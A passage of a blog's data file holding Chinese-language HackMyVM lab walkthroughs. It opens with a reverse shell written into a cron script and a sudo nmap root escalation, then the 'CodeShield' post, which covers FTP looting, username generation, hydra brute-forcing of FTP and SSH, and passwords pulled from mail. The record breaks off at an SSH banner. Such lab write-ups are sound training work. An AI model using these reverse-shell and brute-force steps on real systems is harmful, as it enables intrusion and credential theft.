                   \ndrwxr-xr-x 4 root root 4096 Mar 28  2023 ..                                                                                          \n-rw------- 1 dev  dev  3467 Apr 24  2024 .bash_history                                                                               \n-rw-r--r-- 1 dev  dev   220 Jan  6  2022 .bash_logout                                                                                \n-rw-r--r-- 1 dev  dev  3814 Mar 28  2023 .bashrc                                                                                     \n-rwxrwxr-x 1 root root   56 Mar 28  2023 bye.sh                                                                                      \ndrwx------ 2 dev  dev  4096 Mar 21  2023 .cache                                                                                      \ndrwxrwxr-x 3 dev  dev  4096 Mar 21  2023 .config                                                                                     \ndrwx------ 3 dev  dev  4096 Apr 18  2024 .gnupg                                                                                      \n-rw-rw-r-- 1 root root  280 Jun  2  2023 hello.txt                                                                                   \n-rw------- 1 dev  dev    20 Mar 28  2023 .lesshst                                                                                    \n-rw-r--r-- 1 dev  dev   807 Jan  6  2022 .profile                                                                                    \ndrwx------ 4 dev  dev  4096 Mar 27  2023 snap                                                                                        \n-rw-r--r-- 1 root root   35 May 23  2023 user.txt                                                                                    \ndrwxr-xr-x 2 dev  dev  4096 Jun 19  2023 .vim                                                                                        \n-rw------- 1 dev  dev  9900 Apr 18  2024 .viminfo      \n```\n\n`.bash_history`\u4ed6\u6ca1\u5220\u9664\uff0c\u6211\u4eec\u76f4\u63a5\u770b\u5c31\u597d\u4e86\n\n![image](https://github.com/user-attachments/assets/efa406ee-523b-40c5-9799-e4773c6ed1d2)\n\n\u611f\u5174\u8da3\n\n![image](https://github.com/user-attachments/assets/d91a47c5-10cd-49d6-9e4e-94d4c4d09f56)\n\n\u6211\u4eec\u53ef\u4ee5\u6267\u884c\u8fd8\u662f`analyst`\u7528\u6237\u7684\uff0c\u6211\u76f4\u63a5\u7529\u4e86\u4e00\u4e2a\u53cd\u5f39shell\u4e0a\u53bb\n\n```bash\ndev@Chromatica:~$ echo 'bash -c 'bash -i >& /dev/tcp/192.168.205.141/8888 0>&1'' > /opt/scripts/end_of_day.sh\ndev@Chromatica:~$ cat /opt/scripts/end_of_day.sh\nbash -c 'bash -i >& /dev/tcp/192.168.205.141/8888 0>&1'\n\n```\n\n\u8ba9\u5b50\u5f39\u98de\u4f1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 8888\nlistening on [any] 8888 ...\nid\nconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.215] 58754\nbash: cannot set terminal process group (3073): Inappropriate ioctl for device\nbash: no job control in this shell\nanalyst@Chromatica:~$ id\nuid=1002(analyst) gid=1002(analyst) groups=1002(analyst)\nanalyst@Chromatica:~$ \n\n```\n\n\u5f39\u56de\u6765\u4e86\n\n```bash\nanalyst@Chromatica:~$ sudo -l\nsudo -l\nMatching Defaults entries for analyst on Chromatica:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty\n\nUser analyst may run the following commands on Chromatica:\n    (ALL : ALL) NOPASSWD: /usr/bin/nmap\n\n```\n\n\u53ef\u4ee5\u4f7f\u7528`sudo`\u6743\u9650\u6267\u884cnmap\uff0c\u6253\u5f00`https://gtfobins.github.io/`\u641c\u4e00\u4e0b\u5c31\u6709\u4e86\n\n![image](https://github.com/user-attachments/assets/90440358-1d07-47d8-ac52-8ed56ed63e60)\n\n```bash\nanalyst@Chromatica:~$ TF=$(mktemp)\nTF=$(mktemp)\nanalyst@Chromatica:~$ echo 'os.execute('/bin/sh')' > $TF\necho 'os.execute('/bin/sh')' > $TF\nanalyst@Chromatica:~$ sudo nmap --script=$TF\nsudo nmap --script=$TF\nStarting Nmap 7.80 ( https://nmap.org ) at 2024-12-30 06:59 UTC\nNSE: Warning: Loading '/tmp/tmp.C0v28yTvbc' -- the recommended file extension is '.nse'.\nid\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n\u62ff\u5230root\u4e86\uff0c\u5982\u679c\u4f60\u89c9\u5f97\u4ea4\u4e92shell\u4e0d\u597d\u7528bash -p \u6216\u8005\u81ea\u5df1\u518d\u5f39\u4e00\u4e2ashell\u56de\u6765\u52a0\u56fa\u4e00\u4e0b\u5c31\u597d\u4e86sentence", "top": 0, "createdAt": 1751016768, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P96": {"htmlDir": "docs/post/hmv_CodeShield.html", "labels": ["HackMyVM"], "postTitle": "hmv_CodeShield", "postUrl": "post/hmv_CodeShield.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/96", "commentNum": 0, "wordCount": 28424, "description": "# hmv_CodeShield\n\n# 0.\u7b80\u4ecb\n\n**\u9776\u673a**\uff1a[hackmyvm - CodeShield](https://hackmyvm.eu/machines/machine.php?vm=CodeShield)\n**\u96be\u5ea6**\uff1a\u7eff\u8272\n**\u76ee\u6807 IP**\uff1a192.168.205.138\n**\u672c\u673a IP**\uff1a192.168.205.141\n\n# 1.\u626b\u63cf\n\n`nmap`\u8d77\u624b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sS --min-rate 10000 -p- -Pn -sV 192.168.205.138\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 10:33 CST\nNmap scan report for 192.168.205.138\nHost is up (0.046s latency).\nNot shown: 65526 closed tcp ports (reset)\nPORT      STATE SERVICE       VERSION\n21/tcp    open  ftp           vsftpd 3.0.5\n80/tcp    open  http          nginx\n110/tcp   open  pop3          Dovecot pop3d\n143/tcp   open  imap          Dovecot imapd (Ubuntu)\n443/tcp   open  ssl/http      nginx\n993/tcp   open  imaps?\n995/tcp   open  pop3s?\n3389/tcp  open  ms-wbt-server Microsoft Terminal Service\n22222/tcp open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)\nMAC Address: 08:00:27:61:49:1F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nService Info: OSs: Unix, Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 27.22 seconds\n```\n\n\u5148\u628a\u6211\u4eec\u611f\u5174\u8da3\u7684\u7aef\u53e3\u6311\u51fa\u6765`21\u300180\u3001443\u300122222`\uff0c\u73b0\u5728\u5c31\u8fd9\u51e0\u4e2a\uff0c\u540e\u9762\u6ca1\u6709\u5934\u7eea\u518d\u6311\n\n# 2.\u8e29\u70b9\n\n\u6211\u6bd4\u8f83\u559c\u6b22\u5148\u770bftp21\u7aef\u53e3\u3002\u5148\u5c1d\u8bd5\u533f\u540d\u767b\u5f55\uff08\u7528\u6237\u540d\u548c\u5bc6\u7801\u90fd\u662f**anonymous**\uff09\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ ftp 192.168.205.138\nConnected to 192.168.205.138.\n220 (vsFTPd 3.0.5)\nName (192.168.205.138:kali): anonymous\n331 Please specify the password.\nPassword: \n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls -la\n229 Entering Extended Passive Mode (|||5258|)\n150 Here comes the directory listing.\ndrwxr-xr-x    2 0        137          4096 Aug 30  2023 .\ndrwxr-xr-x    2 0        137          4096 Aug 30  2023 ..\n-rw-rw-r--    1 1002     1002      2349914 Aug 30  2023 CodeShield_pitch_deck.pdf\n-rw-rw-r--    1 1003     1003        67520 Aug 28  2023 Information_Security_Policy.pdf\n-rw-rw-r--    1 1004     1004       226435 Aug 28  2023 The_2023_weak_password_report.pdf\n226 Directory send OK.\nftp> mget *\nmget CodeShield_pitch_deck.pdf [anpqy?]? y\n229 Entering Extended Passive Mode (|||47152|)\n150 Opening BINARY mode data connection for CodeShield_pitch_deck.pdf (2349914 bytes).\n100% |******************************************************************************************|  2294 KiB   76.68 MiB/s    00:00 ETA\n226 Transfer complete.\n2349914 bytes received in 00:00 (75.26 MiB/s)\nmget Information_Security_Policy.pdf [anpqy?]? y\n229 Entering Extended Passive Mode (|||40453|)\n150 Opening BINARY mode data connection for Information_Security_Policy.pdf (67520 bytes).\n100% |******************************************************************************************| 67520       38.67 MiB/s    00:00 ETA\n226 Transfer complete.\n67520 bytes received in 00:00 (30.61 MiB/s)\nmget The_2023_weak_password_report.pdf [anpqy?]? y\n229 Entering Extended Passive Mode (|||49281|)\n150 Opening BINARY mode data connection for The_2023_weak_password_report.pdf (226435 bytes).\n100% |******************************************************************************************|   221 KiB   17.71 MiB/s    00:00 ETA\n226 Transfer complete.\n226435 bytes received in 00:00 (16.96 MiB/s)\n\n```\n\n\u53bb\u6587\u4ef6\u7ba1\u7406\u5668\u67e5\u770b\u4e00\u4e0b\u8fd9\u4e09\u4e2apdf\u6587\u4ef6\n\n1. CodeShield_pitch_deck.pdf\n\n   \u5728\u672b\u5c3e\u53d1\u884c\u4eba\u540d\u3001\u90ae\u7bb1\u3001\u7535\u8bdd\u7b49\u4fe1\u606f\uff0c\u6211\u4eec\u6536\u96c6\u8d77\u6765\u7528\u4e8e\u540e\u7eed\u7684\u7206\u7834\n\n   ```bash\n   Jessica Carlson\n   j.carlson@codeshield.hmv\n   206-555-0146\n   CodeShield\n   ```\n2. Information_Security_Policy.pdf\n\n   \u4e00\u4efd\u5b89\u5168\u624b\u518c\uff0c\u6709CEO\u7684\u540d\u5b57\uff0c\u4f46\u662f\u6211\u4eec\u5df2\u7ecf\u6536\u96c6\u8fc7\u4e86\n3. The_2023_weak_password_report.pdf\n\n   \u6709\u4e00\u4e2a\u5bc6\u7801\u672c\uff0c\u6211\u4eec\u4e5f\u6536\u96c6\u4e00\u4e0b\n\n   ```bash\n   Xxxxxxxxx001\n   Password123!\n   Greatplace2work!\n   Diciembre@2017\n   Hairdresser1!\n   1qa2ws3ed4rf\n   XXXX12345678\n   Hairdresser1\n   Xxxxxxxxx002\n   Xxxxxxxxxx01\n   ```\n\nftp\u670d\u52a1\u7684\u8e29\u70b9\u5230\u6b64\u544a\u4e00\u6bb5\u843d\uff0c\u63a5\u7740\u6211\u4eec\u53bb\u770b\u770b80\u7aef\u53e3\u3002\n\n![Image](https://github.com/user-attachments/assets/24ede8a5-40bb-426a-89f5-a4315fef09fa)\n\n\u5b83\u52a0\u8f7d\u7684\u7279\u522b\u6162\uff0c\u4f60\u53ef\u4ee5\u628a\u8fd9\u4e24\u4e2a\u62e6\u622a\u4e00\u4e0b\u7136\u540e\u5237\u65b0\uff0c\u6216\u8005\u4f60\u628a**burp**\u6253\u5f00\uff0c\u5f00\u4e0a\u4ee3\u7406\u4e5f\u53ef\u4ee5\u89e3\u51b3\u8fd9\u79cd\u95ee\u9898\n\n![Image](https://github.com/user-attachments/assets/9e82acfd-4587-4d74-9955-4dfdf6f5347a)\n\n\u5c06\u4e0a\u9762\u7684\u4eba\u540d\u52a0\u5165\u6211\u4eec\u7684**user**\u4e2d\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u5b83\u5728**\u6b63\u6587\u4e5f\u9690\u85cf\u4e86\u4e00\u4e2a\u4eba\u540d**\n\n![Image](https://github.com/user-attachments/assets/2b3da8c1-a942-450f-9098-9d6c70ca519d)\n\n```bash\nAngelina Johnson\nJennifer Cruise\nJohn Doe\nBob Watson\nMohammed Mansour\nXian Tan\nThomas Mitchell\nPatrick Early\nKevin Valdez\n```\n\n\u6d45\u6d45\u626b\u4e00\u4e0b\u6f0f\u6d1e\u548c\u76ee\u5f55\n\n![Image](https://github.com/user-attachments/assets/4857fc94-ca7c-45ad-911f-6e563f437263)\n\n\u53d1\u73b0\u4e86\u4e00\u4e2a`mail`\uff0c\u4f46\u662f\u8fd9\u4e2a\u6211\u8bb0\u5f97\u6ca1\u6709\u6d1e\uff0c\u5012\u662f\u53ef\u4ee5\u7206\u7834\uff0c\u540e\u9762\u518d\u8bd5\u3002\u76ee\u524d\u6765\u770b\u5e94\u8be5\u662f\u7206\u7834ssh\u670d\u52a1\uff0c\u4f46\u662f\u6211\u4eec\u76ee\u524d\u6536\u96c6\u7684\u7528\u6237\u540d\u662f\u65e0\u6cd5\u76f4\u63a5\u4f7f\u7528\u7684\uff0c\u9700\u8981\u8fdb\u884c\u8f6c\u6362\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ cat user.py  \nimport sys\n\ndef generate_usernames(names):\n    usernames = []\n\n    for name in names:\n        parts = name.split()\n        if len(parts) < 2:\n            print(f'Skipping invalid name: {name}')\n            continue  # \u5982\u679c\u540d\u5b57\u4e0d\u7b26\u5408\u683c\u5f0f\uff08\u6ca1\u6709\u59d3\u6c0f\uff09\uff0c\u5219\u8df3\u8fc7\u8fd9\u4e00\u884c\n      \n        usernames.append(parts[0][0].lower() + parts[1].lower())  # \u59d3\u540d\u7f29\u5199 + \u59d3\u6c0f\n        usernames.append(parts[0].lower() + parts[1].lower())  # \u5168\u540d\n        usernames.append(parts[1].lower() + parts[0][0].lower())  # \u59d3\u6c0f + \u59d3\u540d\u9996\u5b57\u6bcd\n        usernames.append(parts[0].lower())  # \u53ea\u7528\u540d\u5b57\n        usernames.append(parts[1].lower())  # \u53ea\u7528\u59d3\u6c0f\n\n        usernames.append(parts[0][0].lower() + '.' + parts[1].lower())  # 'j.carlson'\n\n    return usernames\n\ndef read_names_from_file(file_path):\n    with open(file_path, 'r') as f:\n        names = f.readlines()\n    # \u53bb\u9664\u6bcf\u884c\u672b\u5c3e\u7684\u6362\u884c\u7b26\n    return [name.strip() for name in names]\n\ndef main():\n    if len(sys.argv) != 2:\n        print('Usage: python3 a.py <filename>')\n        sys.exit(1)\n\n    # \u4ece\u547d\u4ee4\u884c\u53c2\u6570\u83b7\u53d6\u6587\u4ef6\u8def\u5f84\n    file_path = sys.argv[1]\n    try:\n        # \u8bfb\u53d6\u6587\u4ef6\u4e2d\u7684\u540d\u5b57\n        names = read_names_from_file(file_path)\n        # \u751f\u6210\u7528\u6237\u540d\u5217\u8868\n        usernames = generate_usernames(names)\n        # \u6253\u5370\u751f\u6210\u7684\u7528\u6237\u540d\n        for username in usernames:\n            print(username)\n    except FileNotFoundError:\n        print(f'Error: The file {file_path} was not found.')\n        sys.exit(1)\n\nif __name__ == '__main__':\n    main()\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ cat user   \nAngelina Johnson\nJennifer Cruise\nJohn Doe\nBob Watson\nMohammed Mansour\nXian Tan\nThomas Mitchell\nPatrick Early\nKevin Valdez\nj.carlson\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ python3 user.py user >> user\n                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ cat user\nAngelina Johnson\nJennifer Cruise\nJohn Doe\nBob Watson\nMohammed Mansour\nXian Tan\nThomas Mitchell\nPatrick Early\nKevin Valdez\nj.carlson\nSkipping invalid name: j.carlson\najohnson\nangelinajohnson\njohnsona\nangelina\njohnson\na.johnson\njcruise\njennifercruise\ncruisej\njennifer\ncruise\nj.cruise\njdoe\njohndoe\ndoej\njohn\ndoe\nj.doe\nbwatson\nbobwatson\nwatsonb\nbob\nwatson\nb.watson\nmmansour\nmohammedmansour\nmansourm\nmohammed\nmansour\nm.mansour\nxtan\nxiantan\ntanx\nxian\ntan\nx.tan\ntmitchell\nthomasmitchell\nmitchellt\nthomas\nmitchell\nt.mitchell\npearly\npatrickearly\nearlyp\npatrick\nearly\np.early\nkvaldez\nkevinvaldez\nvaldezk\nkevin\nvaldez\nk.valdez\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ cat pass                        \nXxxxxxxxx001\nPassword123!\nGreatplace2work!\nDiciembre@2017\nHairdresser1!\n1qa2ws3ed4rf\nXXXX12345678\nHairdresser1\nXxxxxxxxx002\nXxxxxxxxxx01\n```\n\n\u5148\u5c1d\u8bd5\u7206\u7834**ssh\u670d\u52a1**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ hydra -L user -P pass ssh://192.168.205.138 -I -u -f -e nsr -t 64 -s 22222 \nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-20 14:55:19\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 64 tasks per 1 server, overall 64 tasks, 845 login tries (l:65/p:13), ~14 tries per task\n[DATA] attacking ssh://192.168.205.138:22222/\n[STATUS] 554.00 tries/min, 554 tries in 00:01h, 333 to do in 00:01h, 22 active\n1 of 1 target completed, 0 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-20 14:56:24\n```\n\n\u65e0\u679c\uff0c\u518d\u6d4b\u8bd5\u7206\u7834**ftp\u670d\u52a1**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ hydra -L user -P pass ftp://192.168.205.138 -I -u -f -e nsr -t 64     \nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-20 14:56:47\n[DATA] max 64 tasks per 1 server, overall 64 tasks, 845 login tries (l:65/p:13), ~14 tries per task\n[DATA] attacking ftp://192.168.205.138:21/\n[21][ftp] host: 192.168.205.138   login: valdezk   password: Greatplace2work!\n[STATUS] attack finished for 192.168.205.138 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-20 14:57:11\n```\n\n\u7206\u7834\u51fa\u4e00\u7ec4\u7528\u6237\u548c\u5bc6\u7801\uff0c\u6211\u4eec\u8fdb\u53bb\u770b\u770b\u6709\u5565\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ ftp 192.168.205.138\nConnected to 192.168.205.138.\n220 (vsFTPd 3.0.5)\nName (192.168.205.138:kali): valdezk\n331 Please specify the password.\nPassword: \n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls -la\n229 Entering Extended Passive Mode (|||18011|)\n150 Here comes the directory listing.\ndrwxr-x---   18 1007     1007         4096 Aug 29  2023 .\ndrwxr-xr-x   14 0        0            4096 Aug 26  2023 ..\n-rw-------    1 1007     1007           56 Aug 29  2023 .Xauthority\n-rw-rw-r--    1 1007     1007            0 Aug 28  2023 .bash_history\n-rw-r--r--    1 1007     1007          220 Aug 26  2023 .bash_logout\n-rw-r--r--    1 1007     1007         3771 Aug 26  2023 .bashrc\ndrwx------   12 1007     1007         4096 Aug 29  2023 .cache\ndrwx------   11 1007     1007         4096 Aug 28  2023 .config\ndrwx------    3 1007     1007         4096 Aug 28  2023 .local\ndrwx------    3 1007     1007         4096 Aug 28  2023 .mozilla\ndrwxrwxrwt    2 1007     1007         4096 Aug 29  2023 .pcsc10\n-rw-r--r--    1 1007     1007          807 Aug 26  2023 .profile\ndrwx------    6 1007     1007         4096 Aug 28  2023 .thunderbird\n-rw-r-----    1 1007     1007            5 Aug 29  2023 .vboxclient-clipboard-tty1-control.pid\n-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-clipboard-tty2-control.pid\n-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-clipboard-tty4-control.pid\n-rw-r-----    1 1007     1007            5 Aug 29  2023 .vboxclient-draganddrop-tty1-control.pid\n-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-draganddrop-tty2-control.pid\n-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-draganddrop-tty4-control.pid\n-rw-r-----    1 1007     1007            5 Aug 29  2023 .vboxclient-hostversion-tty1-control.pid\n-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-hostversion-tty2-control.pid\n-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-hostversion-tty4-control.pid\n-rw-r-----    1 1007     1007            5 Aug 29  2023 .vboxclient-seamless-tty1-control.pid\n-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-seamless-tty2-control.pid\n-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-seamless-tty4-control.pid\n-rw-r-----    1 1007     1007            5 Aug 29  2023 .vboxclient-vmsvga-session-tty1-control.pid\n-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-vmsvga-session-tty2-control.pid\n-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-vmsvga-session-tty4-control.pid\n-rw-r--r--    1 1007     1007        18728 Aug 29  2023 .xorgxrdp.10.log\n-rw-------    1 1007     1007         3985 Aug 29  2023 .xsession-errors\ndrwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Desktop\ndrwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Documents\ndrwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Downloads\ndrwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Music\ndrwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Pictures\ndrwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Public\ndrwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Templates\ndrwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Videos\ndrwx------    3 1007     1007         4096 Aug 28  2023 snap\ndrwxrwxr-t    2 1007     1007         4096 Aug 29  2023 thinclient_drives\n```\n\n\u8fdb\u6765\u53d1\u73b0\u6211\u4eec\u4f4d\u4e8e\u5bb6\u76ee\u5f55\u3002\u53c8\u5230\u4e00\u5e74\u4e00\u5ea6\u7684\u627e\u5b9d\u85cf\u73af\u8282\n\n```bash\nftp> pwd\nRemote directory: /home/valdezk/.thunderbird/fx2h7mhy.default-release/ImapMail/mail.codeshield.hmv\n```\n\n\u5728\u8be5\u76ee\u5f55\u4e0b\u6316\u6398\u5230\u4e86\u5b9d\u85cf\ud83d\ude01\n\n![Image](https://github.com/user-attachments/assets/c909abf0-51cf-42b9-9e4b-d7534b6697cc)\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ cat Trash\nFrom - Mon Aug 28 18:38:57 2023\nX-Mozilla-Status: 0001\nX-Mozilla-Status2: 00000000\nReturn-Path: <t.mitchell@codeshield.hmv>\nDelivered-To: k.valdez@codeshield.hmv\nReceived: from mail.codeshield.hmv (mail.codeshield.hmv [127.0.0.1])\n        by mail.codeshield.hmv (Postfix) with ESMTP id 4RXwV61k4Jz62kW\n        for <k.valdez@codeshield.hmv>; Sat, 26 Aug 2023 12:04:30 +0000 (UTC)\nAuthentication-Results: mail.codeshield.hmv (amavisd-new); dkim=pass\n        reason='pass (just generated, assumed good)' header.d=codeshield.hmv\nDKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=codeshield.hmv;\n         h=content-transfer-encoding:content-type:message-id:user-agent\n        :subject:to:from:date:mime-version; s=dkim; t=1693051468; x=\n        1695643469; bh=9j2IFk0ZpW4pfmvikNYY7hFOEsr+Ze1bR/Ba4zdoUeU=; b=V\n        /krnK4TR1tqxJUcKOs1elfa2D4X6hovoYkOpGBtxQgk2+xA4ADTHUnwNcrG4qRh2\n        PG7dbgm+zxZjqfa3x2cdc11BQE9zs4n4D3Hi+aBVUkYFQsQXoWdIpQ7jHntkTSrI\n        Mq0tEEuTXmKD/s7YDseYOq1y5kcUaANPYMdVmaf+C/9q2HqEFY5Kzmd+7xlInUIs\n        nizkQe+0XeZ6l9xmdDPTQVFQS0O98zTYQgMZ/Hd3oQniIF1aB5TocWfNvOcWbDeI\n        S5Cm7IFXX2zs4i8h9j2CTohmYjtAoR+InN2jQYuks3VZaqGaDEfXy5ZfdruFbbrh\n        Liceo3ueN5jYMdBS8Fl3A==\nX-Virus-Scanned: Debian amavisd-new at mail.codeshield.hmv\nReceived: from mail.codeshield.hmv ([127.0.0.1])\n        by mail.codeshield.hmv (mail.codeshield.hmv [127.0.0.1]) (amavisd-new, port 10026)\n        with ESMTP id kyzCgpKZGZvf for <k.valdez@codeshield.hmv>;\n        Sat, 26 Aug 2023 12:04:28 +0000 (UTC)\nReceived: from localhost (mail.codeshield.hmv [127.0.0.1])\n        by mail.codeshield.hmv (Postfix) with ESMTPSA id 4RXwV43FB8z62kJ\n        for <k.valdez@codeshield.hmv>; Sat, 26 Aug 2023 12:04:27 +0000 (UTC)\nMIME-Version: 1.0\nDate: Sat, 26 Aug 2023 12:04:26 +0000\nFrom: t.mitchell@codeshield.hmv\nTo: k.valdez@codeshield.hmv\nSubject: Need some help for data analytics\nUser-Agent: Roundcube Webmail\nMessage-ID: <7d81f2aca5fd7fb5af8609e03cbe1b3a@codeshield.hmv>\nX-Sender: t.mitchell@codeshield.hmv\nContent-Type: text/plain; charset=US-ASCII;\n format=flowed\nContent-Transfer-Encoding: 7bit\n\nHi Kevin,\n\nGreat that you want to help me with the tooling for data analysis. \nPatrick has set some things up, but I can't get it to work properly. As \njust discussed during coffee, I will send you my login details to so \nthat you can fix it under my account and that I can continue working.\n\nPassword: D@taWh1sperer!\n\nThanks buddy!\n\nThomas\n                                                \n\n\u55e8\uff0c\u51ef\u6587\uff0c\n\n\u5f88\u9ad8\u5174\u4f60\u60f3\u5e2e\u52a9\u6211\u5f00\u53d1\u6570\u636e\u5206\u6790\u5de5\u5177\u3002\n\u5e15\u7279\u91cc\u514b\u5df2\u7ecf\u8bbe\u7f6e\u4e86\u4e00\u4e9b\u4e1c\u897f\uff0c\u4f46\u6211\u65e0\u6cd5\u8ba9\u5b83\u6b63\u5e38\u5de5\u4f5c\u3002\u6b63\u5982\n\u6211\u4eec\u559d\u5496\u5561\u65f6\u8ba8\u8bba\u7684\u90a3\u6837\uff0c\u6211\u4f1a\u5c06\u6211\u7684\u767b\u5f55\u8be6\u7ec6\u4fe1\u606f\u53d1\u9001\u7ed9\u4f60\uff0c\n\u8fd9\u6837\u4f60\u5c31\u53ef\u4ee5\u5728\n\u6211\u7684\u8d26\u6237\u4e0b\u4fee\u590d\u5b83\uff0c\u6211\u5c31\u53ef\u4ee5\u7ee7\u7eed\u5de5\u4f5c\u4e86\u3002\n\n\u5bc6\u7801\uff1aD@taWh1sperer\uff01\n\n\u8c22\u8c22\u4f19\u8ba1\uff01\n\n\u6258\u9a6c\u65af\n```\n\n\u8fd9\u4e2a\u7528\u6237\u5e94\u8be5\u4e0d\u662fftp\u4e86\u5427\uff0c\u6536\u6536\u795e\u901a\u5427\uff0c\u8bf7\u8d50\u4e88\u6211\u4e00\u4e2assh\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ hydra -L user -p D@taWh1sperer! ssh://192.168.205.138 -I -u -f -e nsr -t 64 -s 22222\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-20 15:15:11\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 64 tasks per 1 server, overall 64 tasks, 260 login tries (l:65/p:4), ~5 tries per task\n[DATA] attacking ssh://192.168.205.138:22222/\n[22222][ssh] host: 192.168.205.138   login: mitchellt   password: D@taWh1sperer!\n[STATUS] attack finished for 192.168.205.138 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-20 15:15:18\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ ssh mitchellt@192.168.205.138 -p 22222\nThe authenticity of host '[192.168.205.138]:22222 ([192.168.205.138]:22222)' can't be established.\nED25519 key fingerprint is SHA256:Y+iV2eHvzSBp6ZbF+2VqTJdZ5+XyH5tVaxNCzS7tp3I.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '[192.168.205.138]:22222' (ED25519) to the list of known hosts.\n             @@@                          \n      @@@@@@@@@  @@@@@@                   \n @@@@@@@@@@@@@@          (@@              \n @@@@@@@@@@@@@@           @@    \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557  \u2588\u2588\u2557\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557     \u2588\u2588\u2588\u2588\u2588\u2588\u2557                                 \n @@@@@@@@@@@@@@           @@   \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551 